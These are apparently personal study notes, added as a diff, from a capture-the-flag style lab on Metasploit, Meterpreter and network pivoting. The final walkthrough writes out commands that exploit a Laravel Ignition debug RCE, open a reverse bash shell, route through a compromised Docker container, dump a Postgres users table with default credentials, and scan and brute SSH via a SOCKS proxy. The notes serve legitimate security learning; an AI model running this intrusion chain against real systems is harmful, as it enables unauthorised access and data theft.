@@ -1,0 +1,140 @@
+Docker :-
+ - Package application in which dependencies together into single unit called Image
+ - This image then shared and run as container either locally as a developer or remotely on production server
+ - To check compromised app running in Docker container is to verify existence of /.dockerenv file at root 
+   directory of filesystem
+ 
+ 
+Metasploit :-
+ - Penetration testing tools for gaining inital access to systems, performing Post-Exploitation and Pivoting other
+ - Free, Open-Source software owned by the US-based cybersecurity firm Rapid7
+ 
+ 
+
+Metasplout Session :-
+ - Exploiting a remote target, session is often opened by default known as Command Shells or Meterpreter session
+ - Allow for executing commands, Also open SSH or WinRM Sessions
+ 
+ View :- sessions
+ Upgrade last Open Session to Meterpreter :- sessions -u -1
+ Interact with Session 	      :- sessions -i session_id
+ Background Currently Session :- background
+ 
+ 
+Meterpreter :-
+ - Advanced payload that provides interactive access to compromised system
+ - Normal shell not able to run this command you need to upgrade in Meterpreter
+ Ex :-
+  sysinfo  - Get information about the remote system, such as OS
+  ipconfig - Display interfaces 
+  upload file.txt - Upload a file or directory
+  resolve remote_service1 remote_service2 - Resolve Set of hostname on target to IP - useful for pivoting
+  
+  
+  
+  
+What is Pivoting :-
+ - Compromised machine used to send additional web traffic through - allowing previously inaccessible machines
+   to be reached
+ - Network scanning tools such as nmap or arp to find additional machines and services which were previously
+   inaccessible to the pentester known as Network Pivoting
+ 
+ 
+ 
+ 
+Metasploit Cmd :- 
+ msfconsole - to start Metasploit
+ search modulen_name 
+ use module_path
+ msf6 exploit(module_path) > info - View information about module
+ 
+ show options - View available options to 
+ set rhost MACHINE_IP - Set the target host and logging
+ set verbose true     
+ 
+ set lhost LISTEN_IP - Set payload listening address; this is the IP address of the host running Metasploit
+ 
+ show options
+ 
+ check 
+ run
+ 
+
+
+Using Meterpreter to pivot :-
+ - Metasploit has an internal routing table that can be modified with the route command
+ - This routing table determines where to send network traffic through
+ Ex :-
+  route [add/remove] subnet netmask [comm/sid]
+  route add 172.17.0.1/32 -1
+  route print
+
+
+
+Socks Proxy :-
+ - Intermediate server that supports relaying networking traffic between two machines  
+ - Allows you to implement the technique of pivoting
+ - Run socks proxy either locally on pentester machine via Metasploit, or directly on the compromised server
+ Metasploit module :- 
+  use auxiliary/server/socks_proxy
+  curl --proxy socks4a://localhost:9050 http://MACHINE_IP
+  
+ ProxyChains intercept tool request to open new network connection and route request through socks proxy instead :-
+  - proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 MACHINE_IP
+  
+ 
+  
+
+
+
+Walk :-
+ nmap -T4 -A -Pn 10.10.8.114
+ LOad Website -> Network Tab -> Header -> Show Set Cookie
+ - Application may be vulnerable to RCE exploit which impacts Laravel application using debug mode with 
+   Laravel versions before 8.4.2 which use ignite as Developer dependency
+ T msfconsole
+ T show options
+ T use multi/php/ignition_laravel_debug_rce
+ T check rhost=10.10.8.114 HttpClientTimeout=20
+ T ipconfig add localmachine ip in lhost
+ T run rhost=10.10.8.114 lhost=10.17.9.113 HttpClientTimeout=20  
+ T Background :- opened shell will be a basic cmd/unix/reverse_bash
+ T sessions   :- show that shell
+ 
+ T sessions -u -1 :- upgrade session
+ T sessions -i -1 :- Accesss meterpreter session
+ T resolve webservice_database :- Resolve this remote hostname to an IP address 
+ - As this is an internal IP address, it won’t be possible to send traffic to it directly.
+ - leverage the network pivoting support within msfconsole to reach the inaccessible host
+ T route add 172.28.101.51/32 -1
+ - due to the presence of the /.dockerenv file, that we are in a docker container.
+ - By default, Docker chooses a hard-coded IP to represent the host machine
+ T route add 172.17.0.1/32 -1
+ T Route print
+ - With the previously discovered database credentials and the routing table configured, we can start to run
+   Metasploit modules that target Postgre
+ - Starting with a schema dump, followed by running queries to select information out of the database:
+ T use auxiliary/scanner/postgres/postgres_schemadump
+ T run postgres://postgres:postgres@172.28.101.51/postgres
+ - Select information from a specific table 
+ T use auxiliary/admin/postgres/postgres_sql
+ T run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
+ 
+ 
+ To further pivot through the private network, we can create a socks proxy within Metasploit :-
+  T - use auxiliary/server/socks_proxy 
+  T - run srvhost=127.0.0.1 srvport=9050 version=4a
+  - Expose port on attacker machine that used to run other network tools through, such as curl or proxychains
+  T - curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v
+  - From the attacker’s host machine, we can use curl with the internal Docker IP to show that the web 
+    application is running, and the socks proxy works
+  T - proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
+  -    
+  T - use auxiliary/scanner/ssh/ssh_login
+  T - run ssh://santa_username_here:santa_password_here@172.17.0.1
+  
+  
+  
+  
+  
+  
